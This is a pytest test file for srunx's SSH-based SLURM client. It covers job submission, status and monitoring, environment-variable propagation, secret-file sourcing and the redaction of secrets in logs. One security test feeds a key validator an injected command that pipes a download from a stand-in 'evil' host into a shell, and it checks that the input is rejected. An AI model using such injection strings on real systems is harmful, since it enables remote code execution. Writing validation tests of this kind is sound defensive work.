"""Tests for srunx.ssh.core.slurm.SlurmRemoteClient.

Uses the facade as a fixture for convenience (it builds the component
graph for us) but exercises the slurm component directly via
``client.slurm.X``. Mocks target the call site:

* ``client.slurm.execute_slurm_command`` for SLURM CLI invocations.
* ``client.connection.execute_command`` for raw shell commands.
* ``client.files.write_remote_file`` / ``validate_remote_script`` for
  file ops the slurm component calls back into.
"""

import shlex
from unittest.mock import Mock, patch

import pytest

from srunx.ssh.core.client import SSHSlurmClient
from srunx.ssh.core.client_types import SlurmJob


@pytest.fixture
def client():
    """Facade with a mocked SSH transport — components share the connection."""
    c = SSHSlurmClient(
        hostname="test.example.com",
        username="testuser",
        key_filename="/test/key",
    )
    c.connection.ssh_client = Mock()
    c.connection.sftp_client = Mock()
    c.connection.proxy_client = None
    return c


class TestHandleSlurmError:
    def test_command_not_found(self, client):
        with patch.object(client.slurm, "logger") as mock_logger:
            client.slurm._handle_slurm_error("sbatch", "sbatch: command not found", 127)
            assert mock_logger.error.call_count >= 2
            error_calls = [c[0][0] for c in mock_logger.error.call_args_list]
            assert any("SLURM commands not found" in msg for msg in error_calls)

    def test_permission_denied(self, client):
        with patch.object(client.slurm, "logger") as mock_logger:
            client.slurm._handle_slurm_error("sbatch", "Permission denied", 1)
            error_calls = [c[0][0] for c in mock_logger.error.call_args_list]
            assert any("Permission denied" in msg for msg in error_calls)

    def test_invalid_partition(self, client):
        with patch.object(client.slurm, "logger") as mock_logger:
            client.slurm._handle_slurm_error("sbatch", "Invalid partition specified", 1)
            error_calls = [c[0][0] for c in mock_logger.error.call_args_list]
            assert any("Invalid partition" in msg for msg in error_calls)


class TestGetJobStatus:
    def test_completed(self, client):
        client.slurm.execute_slurm_command = Mock(
            return_value=("12345 COMPLETED", "", 0)
        )
        assert client.slurm.get_job_status("12345") == "COMPLETED"

    def test_not_found(self, client):
        client.slurm.execute_slurm_command = Mock(return_value=("", "Job not found", 1))
        assert client.slurm.get_job_status("99999") == "NOT_FOUND"


class TestMonitorJob:
    def test_completion(self, client):
        job = SlurmJob(job_id="12345", name="test_job")
        client.slurm.get_job_status = Mock(side_effect=["RUNNING", "COMPLETED"])

        with patch("time.sleep"):
            result = client.slurm.monitor_job(job, poll_interval=1)

        assert result.status == "COMPLETED"
        assert client.slurm.get_job_status.call_count == 2

    def test_timeout(self, client):
        job = SlurmJob(job_id="12345", name="test_job")
        client.slurm.get_job_status = Mock(return_value="RUNNING")

        with patch("time.sleep"):
            with patch("time.time", side_effect=[0, 1, 2, 3]):
                result = client.slurm.monitor_job(job, poll_interval=1, timeout=2)

        assert result.status == "TIMEOUT"


class TestSubmitSbatchJob:
    def test_success(self, client):
        script_content = "#!/bin/bash\necho 'Hello World'"
        client.files.write_remote_file = Mock()
        client.connection.execute_command = Mock(return_value=("", "", 0))
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        client.slurm._get_slurm_command = Mock(return_value="sbatch")
        client.slurm.execute_slurm_command = Mock(
            return_value=("Submitted batch job 12345", "", 0)
        )

        job = client.slurm.submit_sbatch_job(script_content, job_name="test_job")

        assert job is not None
        assert job.job_id == "12345"
        assert job.name == "test_job"

    def test_failure(self, client):
        script_content = "#!/bin/bash\necho 'Hello World'"
        client.files.write_remote_file = Mock()
        client.connection.execute_command = Mock(return_value=("", "", 0))
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        client.slurm._get_slurm_command = Mock(return_value="sbatch")
        client.slurm.execute_slurm_command = Mock(
            return_value=("", "sbatch: error: invalid option", 1)
        )

        job = client.slurm.submit_sbatch_job(script_content, job_name="test_job")
        assert job is None


class TestJobEnvPropagation:
    """AC-7: job env_vars ride into the remote env prefix + --export=ALL.

    Mocks ``connection.execute_command`` so we can inspect the *full* shell
    command (env prefix + sbatch) that gets sent to the remote — the env
    prefix is assembled in ``execute_slurm_command`` / ``_get_slurm_env_setup``,
    which we exercise for real here.
    """

    def _capture_remote_command(self, client):
        captured: dict[str, str] = {}

        def fake_execute(cmd: str):
            captured["cmd"] = cmd
            # execute_slurm_command wraps the real command in
            # ``bash -l -c '<inner>'``; the inner command's own single quotes
            # are re-escaped by that outer wrapper. Unwrap with shlex so
            # assertions see the de-escaped command actually run on the remote.
            try:
                parts = shlex.split(cmd)
                captured["inner"] = parts[-1] if parts else cmd
            except ValueError:
                captured["inner"] = cmd
            return ("Submitted batch job 12345", "", 0)

        client.connection.execute_command = Mock(side_effect=fake_execute)
        client.slurm._get_slurm_command = Mock(return_value="sbatch")
        return captured

    def test_temp_upload_path_env_prefix_and_export_all(self, client):
        client.files.write_remote_file = Mock()
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        captured = self._capture_remote_command(client)

        job = client.slurm.submit_sbatch_job(
            "#!/bin/bash\necho hi",
            job_name="test_job",
            job_env_vars={"FOO": "bar"},
        )

        assert job is not None and job.job_id == "12345"
        assert "export FOO='bar'" in captured["inner"]
        assert "--export=ALL" in captured["inner"]

    def test_in_place_path_env_prefix_and_export_all(self, client):
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        captured = self._capture_remote_command(client)

        job = client.slurm.submit_remote_sbatch_file(
            "/remote/run.sh",
            job_name="test_job",
            job_env_vars={"FOO": "bar"},
        )

        assert job is not None and job.job_id == "12345"
        assert "export FOO='bar'" in captured["inner"]
        assert "--export=ALL" in captured["inner"]

    def test_env_value_single_quote_escaped(self, client):
        client.files.write_remote_file = Mock()
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        captured = self._capture_remote_command(client)

        client.slurm.submit_sbatch_job(
            "#!/bin/bash\necho hi",
            job_name="test_job",
            job_env_vars={"MSG": "it's working"},
        )

        # Single quote escaped as '\'' within the single-quoted value.
        assert "export MSG='it'\\''s working'" in captured["inner"]

    def test_no_job_env_omits_export_all_temp_upload(self, client):
        """No job env → no --export=ALL, so the script's export policy wins."""
        client.files.write_remote_file = Mock()
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        captured = self._capture_remote_command(client)

        client.slurm.submit_sbatch_job("#!/bin/bash\necho hi", job_name="test_job")

        assert "--export=ALL" not in captured["inner"]

    def test_no_job_env_omits_export_all_in_place(self, client):
        """In-place path must preserve the user's own #SBATCH directives."""
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        captured = self._capture_remote_command(client)

        client.slurm.submit_remote_sbatch_file("/remote/run.sh", job_name="test_job")

        assert "--export=ALL" not in captured["inner"]


class TestSecretDelivery:
    """REQ-8, REQ-9: profile secret file is sourced + triggers --export=ALL."""

    def _bind_secret_store(self, client, *, exists: bool):
        """Bind a profile secret store and stub its remote-facing methods."""
        client.slurm.bind_profile_name("gmo")
        store = client.slurm._secret_store
        store.exists = Mock(return_value=exists)
        # Account-scoped path: no ``secrets/`` subdir, no profile name.
        store.secret_path = Mock(return_value="/home/tester/.config/srunx/secrets.env")
        return store

    def test_env_setup_sources_secret_file_when_present(self, client):
        self._bind_secret_store(client, exists=True)
        setup = client.slurm._get_slurm_env_setup()
        # Path is shlex.quote'd; a plain path with no metacharacters is emitted
        # verbatim (no surrounding quotes needed). Non-blocking ``if ... fi``
        # form so an unreadable/absent file never fails the actual command.
        assert (
            "if [ -r /home/tester/.config/srunx/secrets.env ]; then "
            "set -a; . /home/tester/.config/srunx/secrets.env; set +a; fi"
        ) in setup

    def test_source_prefix_is_non_blocking_not_and_guarded(self, client):
        """The source prefix must not ``&&``-guard the real slurm command.

        A ``[ -r ] && ...`` chain returns non-zero (and short-circuits the
        joined command line) when the file is unreadable/removed between probe
        and run — blocking squeue/scancel/sbatch. The ``if ...; then ...; fi``
        form always exits 0, so the joined command still runs.
        """
        self._bind_secret_store(client, exists=True)
        setup = client.slurm._get_slurm_env_setup()
        # The secret source segment must be an ``if``-form (always exit 0),
        # never a ``[ -r ... ] &&`` guard.
        assert "if [ -r " in setup
        assert "[ -r /home/tester/.config/srunx/secrets.env ] &&" not in setup

    def test_env_setup_omits_source_when_absent(self, client):
        self._bind_secret_store(client, exists=False)
        setup = client.slurm._get_slurm_env_setup()
        assert "set -a" not in setup

    def test_secret_path_with_special_chars_is_shell_quoted(self, client):
        """A resolved secret path containing a space is single-quoted."""
        store = self._bind_secret_store(client, exists=True)
        store.secret_path = Mock(return_value="/home/my user/.config/srunx/secrets.env")
        setup = client.slurm._get_slurm_env_setup()
        assert ". '/home/my user/.config/srunx/secrets.env'" in setup

    def test_secret_file_probed_once_per_submit_temp_upload(self, client):
        """The --export=ALL decision and the source prefix share one probe."""
        store = self._bind_secret_store(client, exists=True)
        client.files.write_remote_file = Mock()
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        captured = TestJobEnvPropagation()._capture_remote_command(client)

        client.slurm.submit_sbatch_job("#!/bin/bash\necho hi", job_name="test_job")

        # Single existence probe drove both the --export=ALL flag and the
        # sourced secret prefix — they are consistent by construction.
        assert store.exists.call_count == 1
        assert "--export=ALL" in captured["inner"]
        assert "secrets.env" in captured["inner"]

    def test_secret_file_probed_once_per_submit_in_place(self, client):
        store = self._bind_secret_store(client, exists=True)
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        captured = TestJobEnvPropagation()._capture_remote_command(client)

        client.slurm.submit_remote_sbatch_file("/remote/run.sh", job_name="test_job")

        assert store.exists.call_count == 1
        assert "--export=ALL" in captured["inner"]
        assert "secrets.env" in captured["inner"]

    def test_secret_present_adds_export_all_temp_upload(self, client):
        self._bind_secret_store(client, exists=True)
        client.files.write_remote_file = Mock()
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        captured = TestJobEnvPropagation()._capture_remote_command(client)

        # No job env vars, but a secret file exists -> --export=ALL applies.
        client.slurm.submit_sbatch_job("#!/bin/bash\necho hi", job_name="test_job")

        assert "--export=ALL" in captured["inner"]
        assert "secrets.env" in captured["inner"]

    def test_secret_present_adds_export_all_in_place(self, client):
        self._bind_secret_store(client, exists=True)
        client.files.validate_remote_script = Mock(return_value=(True, ""))
        captured = TestJobEnvPropagation()._capture_remote_command(client)

        client.slurm.submit_remote_sbatch_file("/remote/run.sh", job_name="test_job")

        assert "--export=ALL" in captured["inner"]


class TestCleanupJobFiles:
    def test_local_script_with_cleanup(self, client):
        job = SlurmJob(
            job_id="12345",
            name="test_job",
            script_path="/tmp/srunx/test_script.sh",
            is_local_script=True,
            _cleanup=True,
        )
        client.files.cleanup_file = Mock()

        client.slurm.cleanup_job_files(job)

        client.files.cleanup_file.assert_called_once_with("/tmp/srunx/test_script.sh")

    def test_no_cleanup_flag(self, client):
        job = SlurmJob(
            job_id="12345",
            name="test_job",
            script_path="/tmp/srunx/test_script.sh",
            _cleanup=False,
        )
        client.files.cleanup_file = Mock()

        client.slurm.cleanup_job_files(job)
        client.files.cleanup_file.assert_not_called()


class TestEnvVarSecurity:
    """Env-var key validation (#222) and debug-log redaction (#221)."""

    def test_redact_exports_masks_values(self):
        from srunx.ssh.core.slurm import _redact_exports

        out = _redact_exports("export API_KEY='sk-secret' && sbatch job.sh")
        assert "sk-secret" not in out
        assert "export API_KEY='***'" in out

    def test_env_key_regex_rejects_shell_metachars(self):
        from srunx.ssh.core.slurm import _ENV_KEY_RE

        assert _ENV_KEY_RE.fullmatch("API_KEY")
        assert not _ENV_KEY_RE.fullmatch("X=1; curl evil|sh #")
        assert not _ENV_KEY_RE.fullmatch("1BAD")

    def test_get_slurm_env_setup_rejects_bad_key(self):
        client = SSHSlurmClient(hostname="h", username="u", key_filename="k")
        with pytest.raises(ValueError, match="Invalid environment variable name"):
            client.slurm._get_slurm_env_setup({"BAD KEY": "v"})

    def test_redaction_applies_before_outer_quote(self):
        """Regression: redact the unquoted command, not the shlex.quoted one.

        The debug log wraps the command in `bash -l -c <shlex.quote(cmd)>`.
        Quoting rewrites the inner `export KEY='...'` single quotes into
        `'"'"'` sequences the redaction regex can't match, so redaction must
        run on the unquoted string.
        """
        import shlex

        from srunx.ssh.core.slurm import _redact_exports

        client = SSHSlurmClient(hostname="h", username="u", key_filename="k")
        final_command = client.slurm._get_slurm_env_setup({"API_KEY": "sk-secret"})
        assert "sk-secret" in final_command  # unredacted baseline

        # The (fixed) log path: redact then quote — secret is gone.
        logged = f"bash -l -c {shlex.quote(_redact_exports(final_command))}"
        assert "sk-secret" not in logged
        # The (buggy) log path: quote then redact — secret would survive.
        buggy = _redact_exports(f"bash -l -c {shlex.quote(final_command)}")
        assert "sk-secret" in buggy
